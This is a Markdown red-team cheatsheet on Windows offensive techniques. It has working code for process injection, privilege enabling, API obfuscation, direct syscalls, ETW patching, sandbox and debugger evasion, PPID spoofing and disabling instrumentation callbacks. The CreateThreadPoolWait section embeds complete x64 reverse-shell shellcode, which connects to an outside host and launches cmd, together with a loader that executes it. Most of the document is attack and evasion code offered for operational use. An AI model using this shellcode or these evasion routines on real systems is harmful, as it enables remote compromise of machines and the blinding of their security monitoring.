# Win32 Offensive Cheatsheet

Win32 and Kernel abusing techniques for pentesters & red-teamers made by [@UVision](https://github.com/matthieu-hackwitharts) and [@RistBS](https://twitter.com/RistBs)

**Dev mode enabled, open to any help :)**

- [Windows Binary Documentation](#windows-binary-documentation)
  - [PE structure](#pe-headers)
   - [PE Headers ](#pe-headers)
   - [Parsing PE ](#parsing-pe)
   	- [Export Address Table (EAT) ](#export-address-table-eat)
  	- [Resolve function address ](#resolve-function-address)
   - [Import Address Table (IAT) ](#import-address-table-iat)
     - [Parsing IAT ](#parsing-iat)
   - [Import Lookup Table (ILT) ](#import-lookup-table)
   - [Enable SeDebug privilege](#enable-sedebug-privilege)
- [Execute some binary](#execute-some-binary)
  - [Classic shellcode execution](#classic-shellcode-execution)
  - [DLL execute ](#dll-execute)
  - [RAW file to PE](#raw-file-to-pe)
- [Code injection techniques](#code-injection-techniques)
  - [CreateRemoteThread injection](#createremotethread-injection)
  - [Process Hollowing](#process-hollowing)
  - [APC Queue technique](#apc-queue-technique)
  - [Early Bird](#early-bird)
  - [Reflective DLL Injection](#reflective-dll-injection)
  - [Dll injection](#dll-injection)
  - [Process Doppelganging](#process-doppelganging)
  - [Fibers](#fibers)
  - [CreateThreadPoolWait](#createthreadpoolwait)
  - [Thread Hijacking](#thread-hijacking)
  - [MapView code injection ⏳]()
  - [Module Stomping](#module-stomping)
  - [Function Stomping](#function-stomping)
- [Hooking techniques](#hooking-techniques)
  - [Inline hooking](#inline-hooking)
  - [IAT hooking](#iat-hooking)
- [RE Bypass techniques](#re-bypass-techniques)
  - [Call and Strings obfuscation](#call-and-strings-obfuscation)
  - [Manual function resolve](#manual-function-resolve) 
  - [Win32 API Hashing](#win32-api-hashing)
- [EDR/Endpoint bypass](#edrendpoint-bypass)
  - [Direct syscall ](#direct-syscall)
  - [High level languages ](#high-level-languages)
  - [Patch inline hooking](#patch-inline-hooking)
  - [Detect hooks](#detect-hooks)
  - [Patch ETW](#patch-etw)
  - [Sandbox bypass](#sandbox-bypass)
  - [Debugging Bypass](#debugging-bypass)
  - [VirtualProtect technique](#virtualprotect-technique)
  - [Fresh copy unhook](#fresh-copy-unhook)
  - [Hell's Gate](#hells-gate)
  - [Heaven's Gate](#heavens-gate)
  - [PPID spoofing](#ppid-spoofing)
  - [Process Instrumentation Callback](#process-instrumentation-callback)
  - [Heap Encryption](#heap-encryption)
  - [Sleep Obfuscation](#sleep-obfuscation)
- [Driver Programming basics](#driver-programming-basics)
  - [General concepts](#general-concepts)
  - [System Service Dispatch Table (SSDT)](#system-service-dispatch-table-ssdt)
  - [Driver entry](#driver-entry)
  - [Input Output)](#input-output)
  - [Communicate with driver](#communicate-with-the-driver)
  - [Driver signing (Microsoft)](#driver-signing)
  - [Custom callbacks (ObRegisterCallbacks)](#custom-callbacks)
- [Offensive Driver Programming](#offensive-driver-programming)
  - [Patch kernel callback](#patch-kernel-callback)
  - [Patch protected process](#patch-protected-process)
- [Using Win32 API to increase OPSEC](#using-win32-api-to-increase-opsec)
  - [Persistence ⏳]()
    - [Scheduled Tasks ⏳]()
  - [Command line spoofing](#command-line-spoofing)
- [Misc Stuff](#misc-stuff)
  - [x64 Calling Convention](#x64-calling-convention)
  - [Indirect Execution](#indirect-execution)
    - [CFG Bypass with SetProcessValidCallTargets](#cfg-bypass-with-setprocessvalidcalltargets)

<br>

- [Malware/Sophisticated techniques](#malwaresophisticated-techniques)
  - [Case of Emotet : PPID Spoofing using WMI](#emotet-ppid-spoofing)
  - [Zeus malware hidden files technique](#zeus-malware-hidden-files)
  - [SpyEye keyloger hooking technique](#spyeye-keyloger-hooking-technique)
  - [Most ridiculous malware stop (WannaCry)](#wannacry-killswitch)

<br>

# Windows Binary Documentation

## Useful tools and Websites/Books/Cheatsheet

- 🔹 https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/ (Very Good Cheatsheet)
- 🔹 https://www.ired.team/ (Awesome red team cheatsheet with great code injection notes)
- 🔹 https://undocumented.ntinternals.net/ (Undocumented NT functions)
- 🔹 https://docs.microsoft.com/en-us/windows/win32/api/ (Microsoft Official Doc)
- 🔹 [Windows Kernel Programming - Pavel Yosifovich](https://www.amazon.fr/Windows-Kernel-Programming-Pavel-Yosifovich/dp/1977593372)
- 🔹 https://research.checkpoint.com/ (Very interesting docs about evasion, anti-debug and so more)
- 🔹 https://www.vx-underground.org/ (Awesome content about malware dev and reverse)

## PE Structure

### PE Headers

- `DOS_HEADER` : First Header of PE, contains MS DOS message ("This programm cannot be run in DOS mode...."), MZ Header (Magic bytes to identify PE) and some stub content.
- `IMAGE_NT_HEADER` : Contains PE file signature, File Header and Optionnal Header
- `SECTION_TABLE` : Contains sections headers
- `SECTIONS` : Not a header but useful to know : these are sections of the PE

> Details : https://www.researchgate.net/figure/PE-structure-of-normal-executable_fig1_259647266


### Parsing PE

**Simple PE parsing to retrieve IAT and ILT absolute address:**

- **Obtain base address** : `GetModuleHandleA(NULL);`
- **PIMAGE_DOS_HEADER** = base address, dos header
- **PIMAGE_NT_HEADER** = `BaseAddress+PIMAGE_DOS_HEADER.e_lfnanew` (RVA NT_HEADER)
- **IMAGE_DATA_DIRECTORY** = `OptionnalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]` of PIMAGE_NT_HEADER
- **IMAGE_IMPORT_DIRECTORY** = `IMAGE_DATA_DIRECTORY.VirtualAddress` (RVA of IMAGE_IMPORT_DIRECTORY)
- **IMAGE_IMPORT_DESCRIPTOR** = `BaseAddress + IMAGE_IMPORT_DIRECTORY.VirtualAddress` (RVA of IMAGE_IMPORT_DESCRIPTOR)
- **IAT absolute address** : IMAGE_IMPORT_DESCRIPTOR.FirstThunk (RVA IAT) + BaseAddress
- **ILT absolute address** : IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk (RVA ILT) + BaseAddress


### Export Address Table (EAT)

The EAT Resolves all functions that are exported by the PE & resolves also DLLs. It Defined in IMAGE_EXPORT_DIRECTORY structure:
```c   
typedef struct _IMAGE_EXPORT_DIRECTORY {
		DWORD Characteristics;
		DWORD TimeDateStamp;
		WORD  MajorVersion;
		WORD  MinorVersion;
		DWORD Name;   // name of DLL
		DWORD Base;   // first ordinal number
		DWORD NumberOfFunctions; // number of entries in EAT
		DWORD NumberOfNames; // number of entries in (1) (2)
		DWORD AddressOfFunctions; // RVA EAT and contains also RVA of exported functions
		DWORD AddressOfNames;   // Pointer array contains address of function names
		DWORD AddressOfNameOrdinals; // Pointer array contains address of ordinal number of functions (index in AddressOfFunctions)
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;   
```
 
### Resolve function address

**Using function address**
 
What do you wait ? Find this function !
 
**Using ordinal number**
 
An ordinal number is an **index position** to the corresponding function address in `AddressOfFunctions` array. It can be used to **retrieve the correct address of function**, like below : 
 
 Let's try to find the corresponding address (Addr4) with given ordinal number 3.
 
 - **AddressOfFunctions** : *Addr1 Addr2 Addr3 Addr4 .... AddrN*
 - **AdressOfNameOrdinals** : *2 5 7 3 ... N*
 
 The address we are looking for is on 3th position (from 0), and our ordinal number corresponds to the **index of this address**.
 
 **Using function name**
 
The Nth element in AddressOfNames array corresponding to the Nth element in AddressOfNameOrdinals array : using a given name, you can retrieve the corresponding ordinal number, and proceed to find the function address using this number.

## Import Address Table (IAT)

- The PE loader doesn't know what address is corresponding to which function (again more with ASLR) : Let's call IAT to save us 
- Defined in IMAGE_IMPORT_DIRECTORY struct:
```c
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    DWORD	Characteristics; 
    DWORD	OriginalFirstThunk;	// RVA to ILT
    DWORD	TimeDateStamp;	
    DWORD	ForwarderChain;
    DWORD	Name; 		        // RVA of imported DLL name
    DWORD	FirstThunk;             // RVA to IAT
} IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;
```

## Parsing IAT

1) Obtain RVA of IAT 
2) Parse trough IMPORT_DESCRIPTOR structure : Name member is the RVA of the name of current DLL
3) To get the real DLL name : find it in ILT (originalFirstThunk+BaseAddress)
4) To get exported functions of current DLL : PIMAGE_IMPORT_BY_NAME function_name->Name = ImageBase+AdressOfData

> Detailed code example here : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/miscellaneous/iat_parser.cpp

## Import Lookup Table

Every DLLs imported by PE has its own ILT.
```
Absolute address of ILT = BaseAddress + OriginalFirstThunk (IAT)
```
It contains all functions name that are in imported DLL.

<br>


## Enable SeDebug Privilege

The **SeDebug** privilege is the "most wanted" priv in all the Windows privileges list. It allow you to "debug" any authorized process, which can be translated as several offensives actions, like opening a handle with ```PROCESS_ALL_ACCESS``` privileges.

To enable it in usermode, you will need to use a function such as : 

```cpp
void EnableDebugPriv()
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);

    CloseHandle(hToken); 
}
```

This function will open your current process token, then adjust it to **SE_PRIVILEGE_ENABLED** privilege, wich is corresponding to the target privilege.

# Execute some binary

## Classic shellcode execution

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/classic.cpp

## DLL Execute

This technique had some good successful bypass rates few years ago; however, because of increasing number of EDR and other endpoint solutions, writing on disk should as possible be avoided.

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/dll_classic.cpp

## Raw File To PE

You can execute some raw binary file in memory by allocate its size space in a  memory region :

```cpp
HANDLE binfile = CreateFileA("myfile.bin",GENERIC_READ,NULL,NULL,OPEN_EXISTING,NULL,NULL);
SIZE_T size = GetFileSize(binfile,NULL);
LPVOID buffer=NULL;
ReadFile(binfile,buffer,size,NULL,NULL);
HANDLE hProc = GetCurrentProcess();

CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
CloseHandle(hProc);
```

<br>

# Code injection techniques

## CreateRemoteThread injection

Simply write your shellcode in previously allocated memory space inside the target process. (Not OPSEC)

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/create_thread_injection.cpp

## Process Hollowing

Process Hollowing is made in several steps : 

- Create the targeted process ("hollowed" one) in suspended mode : it is needed to modify it
- Unmap the targeted process from its PEB (You must declare this structure first)
- Write the content of the new exe in this process : headers + content
- Parse and apply relocation table 
- Let the process continue to run in its thread
- Enjoy

> Complete POC can be found here : https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations

## APC Queue Technique

Inject your shellcode in all available threads in a process, then use ```QueueUserAPC()``` function to query an APC call. This technique can not be reliable when there are no many threads in the compromised process.

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/apc.cpp

## Early Bird

Similar to APC Queue injection, here the APC call must be set in a suspended process. The created process main thread is then resume; the main advantage of this technique is that avoiding writing the shellcode in a running process will be less detected by AV/EDRs.

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/earlybird.cpp


## Reflective DLL Injection

As with the "static" dll injection (by using dll file), you can inject your own DLL in most processes by reflecting it in memory. It has the advantage to easily bypass some AV/EDrs products despite it's a quite flagged way today.

You must first allocate memory and do some reloc work to make it works.

The well-knowned Poc about this technique was published by stephenfewer : https://github.com/stephenfewer/ReflectiveDLLInjection

## Dll injection

You can inject some code stored in a dll in a remote process. Unfortunately, EDRs product will likely catch it easily, especially if malicious dll touch the disk.

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/dll_injection.cpp

## Process Doppelganging

Process Doppelganging was until a few years an untected method of launching your own payload into some tricky way. It has been demonstrated at BlackHat 2017 by Tal Liberman and Eugene Kogan, see their amazing work : https://www.youtube.com/watch?v=Cch8dvp836w

It is an "intermediate" step before the process hollowing technique : the PE image is indeed overwrited before to get executed, so the WindowsLoader make the Process Hollowing for us (so cool, right ?).

Hasherezade has maked some cool POC of this technique, availabe here : https://github.com/hasherezade/process_doppelganging

## Fibers

Fibers can be defined as ```cooperatively scheduled threads (https://nullprogram.com/blog/2019/03/28/)```. It allows the main program to execute the shellcode trough this new thread type. 

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/fiber.cpp

## CreateThreadPoolWait ⏳

## Thread Hijacking ⏳

## MapView code injection ⏳

## Module Stomping

This technique cause your beacon to be backed by a module on disk

```c
CHAR moduleName[]  = "windows.storage.dll\x00";
HMODULE hVictimLib = LoadLibraryA(moduleName);

DWORD_PTR RXSection = (DWORD_PTR)hVictimLib;
RXSection 	   += 0x1000 * 0x2;
RXSection  	   += 0xc;
char* ptr 	    = ( char* )RXSection;
```

> to detect module stomping (especially for Cobalt Strike) a scanner was released named [DetectCobaltStomp](https://github.com/slaeryan/DetectCobaltStomp) to highlight some IoCs of the technique, but the [author](https://twitter.com/NinjaParanoid) of [Brute Ratel](https://bruteratel.com/) managed to [improve](https://www.youtube.com/watch?v=nPmcFKSHyvg&ab_channel=ChetanNayak) the original technique.

## Function Stomping

Simply replace the original function address (obtained with GetProcAddress) with the new one. This technique is well detailed by his author : https://idov31.github.io/2022-01-28-function-stomping/

<br>

# Hooking techniques

## Inline hooking
 
Inline hooking is the most basic way to hook a function : it simply consists to redirect the API call to your own function (jump)

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/hooking/inline.cpp

## IAT hooking

By modifying the corresponding function address to a pointer on your own function, you can make the programm executing your own code.

It can be done by following several steps : 

- Find the relative address of IAT
- Parse the IAT to find the function you want to hook
- Replace this function address ("patch") with the adress of your function
- Enjoy

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/hooking/iat.cpp

<br>

# RE Bypass techniques

## Call and Strings obfuscation

There are several techniques you can use to hide your calls to win32 api, here are some of them: 

- Use `char[]` array to splice your function/dll names into multiple chars
```cpp
char sWrite[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0x0}; //don't forget the null byte
```

> You can even combine this trick with some ASCII char code convert.

## Manual function resolve

You can manually resolve a pointer to any function of kernel32, ntdll and so more.

- First declare the template of your function, based on the real function header : 
```cpp
typedef HANDLE(WINAPI* myOpenProcess)(DWORD,BOOL,DWORD); //if you work directly with ntdll, use NTAPI*
```
- Then resolve a pointer to the function :
```cpp
myOpenProcess op_proc = (myOpenProcess*)GetProcAddress(LoadLibraryA("ndll.dll"),"OpenProcess"));
op_proc(PROCESS_ALL_ACCESS,NULL,12345);
```

> Don't hesitate to combine this technique with some strings obfuscation to avoid passing the real func name in plaintext.

## Win32 API Hashing

You can hide your API function calls by hash them with some hash algorithm (djb2 is the most used), be careful of hash collision that are possible with some special funcs. Then combine this technique with a direct address resolving in EAT, and let reversers cry :)

<br>

# EDR/Endpoint bypass


## Direct Syscall

Most EDR products will hook win32 api calls in user mode (PatchGuard strongly decrease kernel hooks availability). To avoid these hooks, you can directly call Nt() equivalent to your api functions.

- 
```asm
.code
	SysNtCreateFile proc
			mov r10, rcx //syscall convention
			mov eax, 55h //syscall number : in this case it's NtCreateFile
			syscall //call nt function
			ret
	SysNtCreateFile endp
end
```
> Find the right syscall number at this table : https://j00ru.vexillium.org/syscalls/nt/64/


- Build the Function Prototype using `NTSTATUS`
```cpp
EXTERN_C NTSTATUS SysNtCreateFile(
	PHANDLE FileHandle, 
	ACCESS_MASK DesiredAccess, 
	POBJECT_ATTRIBUTES ObjectAttributes, 
	PIO_STATUS_BLOCK IoStatusBlock, 
	PLARGE_INTEGER AllocationSize, 
	ULONG FileAttributes, 
	ULONG ShareAccess, 
	ULONG CreateDisposition, 
	ULONG CreateOptions, 
	PVOID EaBuffer, 
	ULONG EaLength);
```
- Resolve the NT address
```cpp
FARPROC addr = GetProcAddress(LoadLibraryA("ntdll"), "NtCreateFile");
```

> Code sample : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/evasion/direct_syscall.cpp

## High Level Languages

C++/C are often more flagged by AV/EDR products than high level equivalent languages : use Go, Rust or other language to craft your best templates,

## Patch Inline Hooking

Simply (re) hook your hooked functions by apply the right function call: https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/hooking/inline.cpp

## Detect hooks

To detect hooks, you'll first get the base address of the NTDLL with `LoadLibrary`, then you will parse the PE headers to locate EAT (IMAGE_EXPORT_DIRECTORY) and its offsets which will contain all the important information (exported functions + name). just resolve function names & addresses while iterating through exported functions and apply the following `if` statements to sort functions

- sort functions to get only Nt or Zw functions
```c
if (strncmp(functionName, (char*)"Nt", 2) == 0 || strncmp(functionName, (char*)"Zw", 2) == 0) { // ... }
```

> **⚠️** : some functions are false positive I recommand you to detect them :
```c
        if (strncmp(functionName, (char*)"NtGetTickCount", 14) == 0 ||
             strncmp(functionName, (char*)"NtQuerySystemTime", 17) == 0 ||
              strncmp(functionName, (char*)"NtdllDefWindowProc_A", 20) == 0 ||
               strncmp(functionName, (char*)"NtdllDefWindowProc_W", 20) == 0 ||
                strncmp(functionName, (char*)"NtdllDialogWndProc_A", 20) == 0 ||
                 strncmp(functionName, (char*)"NtdllDialogWndProc_W", 20) == 0 ||
                  strncmp(functionName, (char*)"ZwQuerySystemTime", 17) == 0) { }
```

- for the last `if` statement, check if the first 4 bytes of `functionName` is equal to `mov r10, rcx; mov eax, ##` which is the beginning of the syscall stub
```c
if (memcmp(functionAddress, syscallPrologue, 4) != 0) { // ... }
```

> Code sample: https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/tree/main/evasion/detect_hooks.c


## Patch ETW

Event Tracing for Windows (ETW) is a logging low-level API which can be used for debugging/logging kernel and usermode process. It has been first implemented in Windows 2000, but realtime monitoring is really available since Windows XP.

ETW API is available from headers files provided by Microsoft : https://docs.microsoft.com/fr-fr/windows/win32/api/_etw/

In a pentest operation, you should care about this functionality by patching it : the most used way is to write arbitrary ```ret``` opcodes into the ETW event writing function (```EtwEventWrite```) to avoid logs be writing somewhere.

Code sample : //

## Sandbox Bypass

Sandbox are quite used by AV/EDRs to test some API calls and other part of code before to really execute your programm. There are several techniques to avoid this tool, here are some of them below :

- Wait. Seriously. Such function as `Sleep()` or `time.sleep()` or equivalent will do the job, for some seconds before to execute the real shellcode.
- Try to allocate lot of memory (malloc), like 100000000 bytes.
- Try to detect if you are actually in a sandbox (VM) environnement : test for open process,files and others suspicious things.
- Try to resolve a fake (not working) URL : many AVs products will respond with fake page.
- Use strange and rarely used Api calls, like `VirtualAllocExNuma()` most sandbox cannot emulate this type of call.
```cpp
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
```

## Debugging Bypass

Not a real AV evasion technique, but still useful to avoid being reversed too easily by RE engineers. There are so many ways to detect or make debuggers crazy, but here are some of them below : 

**Flags way**

You can use ```IsDebuggerPresent()``` (Win32) or direct call ```NtQueryInformationProcess()``` (not so very documented) to check for debug flags.


**Handles way**

Try to close invalid (missing) handles with CloseHandle() API. The debugger will try to catch the exception, which can be easily detected : 
```cpp
bool Check() //https://anti-debug.checkpoint.com/techniques/object-handles.html#closehandle
{
    __try
    {
        CloseHandle((HANDLE)0xDEADBEEF);
        return false;
    }
    __except (EXCEPTION_INVALID_HANDLE == GetExceptionCode()
                ? EXCEPTION_EXECUTE_HANDLER 
                : EXCEPTION_CONTINUE_SEARCH)
    {
        return true;
    }
}
```

**ASM way**

Try to make an INT 3 call (ASM) : it's an equivalent to a software breakpoint, which will trigger a debugger. There are so many other ways to detect any debugger, a lot of them are compiled at : https://anti-debug.checkpoint.com/

## VirtualProtect technique

By using some tricks with `VirtualProtect()` you can easily avoid been flagged in-memory : change between `PAGE_EXECUTE_READWRITE` and `PAGE_READWRITE` (less suspicious) to avoid triggering your favorite AV.


## Fresh Copy Unhook

Avoid hooks by replacing the "hooked" ntdll by a fresh one, directly mapped from the disk.

Code sample : // to add

## Hells Gate

To avoid using hardcoded syscalls, Hell's Gate (Hells Gates ?) retrieve them dynamically by parsing EAT (compare memory bytes to syscall opcodes). The original Poc has been made by the great VX-Underground team, and can be found here : https://papers.vx-underground.org/papers/Windows/Evasion%20-%20Systems%20Call%20and%20Memory%20Evasion/Dynamically%20Retrieving%20SYSCALLs%20-%20Hells%20Gate.7z

Another one example : https://github.com/am0nsec/HellsGate

## Heavens Gate

Use Wow64 to inject 64 bits payload in 32 bits loader. Can be useful to bypass some AV/EDRs because Wow64 will avoid you to be catch in userland.

The most known version of this technique has been created by the MSF team, see their awesome work here : https://github.com/rapid7/metasploit-framework/blob/21fa8a89044220a3bf335ed77293300969b81e78/external/source/shellcode/windows/x86/src/migrate/executex64.asm

## CreateThreadPoolWait

By abusing CreateThreadPoolWait(), which can accept a pointer to a callback function, you can execute your shellcode through this proc. Lot of similar techniques (using a callback function pointer) are available at : http://ropgadget.com/posts/abusing_win_functions.html

Example : 

```cpp
//code from https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait

#include <windows.h>
#include <threadpoolapiset.h>

unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


int main()
{
	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));

	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
	SetThreadpoolWait(threadPoolWait, event, NULL);
	WaitForSingleObject(event, INFINITE);
	
	return 0;
}
```

## Thread Hijacking

Hijack a thread into a remote process by suspend it, then replace its RIP register (or EIP if you are in x86) with your own shellcode address. 

Code example : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/shellcode_samples/thread_hijacking.c

## PPID Spoofing

When a suspicious/anormal process start below a "legit" or unattended process parent, it become very suspicious. Think about a malicious Word macro which deploy a powershell process : such strange, right ?

PPID Spoofing can avoid that by allowing you to modify the parent process id (PPID) of your spawned process.

```cpp
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

//code from : https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing
int main() 
{
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	
	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 6200);

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

	return 0;
}
```

## Process Instrumentation Callback

Process Instrumentation Callback is defined as the `ProcessInstrumentationCallback` flag (`0x40`) and is used by security products to [detect potential direct syscall](https://winternl.com/detecting-manual-syscalls-from-user-mode/) invocation by registering a callback to check if the `syscall` instruction comes from the executable image and not NTDLL. To bypass it for our process we just have to set `Callback` to `NULL`

```c
PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;

InstrumentationCallbackInfo.Version  = 0x0;
InstrumentationCallbackInfo.Reserved = 0x0;
InstrumentationCallbackInfo.Callback = NULL;

NtSetInformationProcess( hProcess, ProcessInstrumentationCallback, &InstrumentationCallbackInfo, sizeof( InstrumentationCallbackInfo ) );
```
> it's still "undocumented" by microsoft but [Alex Ionescu](https://twitter.com/aionescu) has documented it [here](https://www.youtube.com/watch?v=pHyWyH804xE&ab_channel=S%C3%A9bastienDuquette) and Everdox has also done so [here](https://www.codeproject.com/Articles/543542/Windows-x64-system-service-hooks-and-advanced-debu)

> Full code to bypass instrumentation here : https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet/blob/main/evasion/disable_instrumentation_callback.c

## Heap Encryption

Walk the heap with `HeapWalk` and then encrypt the allocations :
```c
VOID HeapEncryptDecrypt() {
    PROCESS_HEAP_ENTRY HeapWalkEntry;
    SecureZeroMemory( &HeapWalkEntry, sizeof( HeapWalkEntry ) );
    while ( HeapWalk( GetProcessHeap(), &HeapWalkEntry ) ) {
        if ( ( HeapWalkEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) != 0 ) {
            XORFunction( key, keySize, ( char* )( HeapWalkEntry.lpData ), HeapWalkEntry.cbData );
        }
    }
}
```
> more informations here: https://www.arashparsa.com/hook-heaps-and-live-free/

## Sleep Obfuscation

Many PoCs around sleep obfuscation came out with different mechanisms (UM APCs, TP and more) here we take as example [Ekko](https://github.com/Cracked5pider/Ekko/) which is the most easiest PoC to understand.

the ROP chain of Ekko is very simple, it changes memory prot. to `RW`, encrypt the region with `SystemFunction032` which implement RC4, Sleep with `WaitForSingleObject`, Decrypt the region and switch again the prot. to `RWX`. Finally, it queues all `CONTEXT` with `CreateTimerQueueTimer`


> Some scanners like [TickTock](https://github.com/WithSecureLabs/TickTock) or [Patriot](https://github.com/joe-desimone/patriot) has been released to detect that but you can avoid them by using a trampoline to `NtContinue` in NTDLL with gadget and replacing `Rip` register in ROP chain
 
<br>
 
# Driver Programming basics

## General concepts

Driver are used to execute code in kernel mode rather than in user mode. It is a powerful technique to bypass all usermode hooks and monitoring which were set by AV/EDRs. It can be also used to bypass kernel callbacks and other kernel monitoring.

The code of any driver must be verified (any warning should be treated as an error) to ensure it will be crash-free (You don't want to cause BSOD during pentest, right ?).

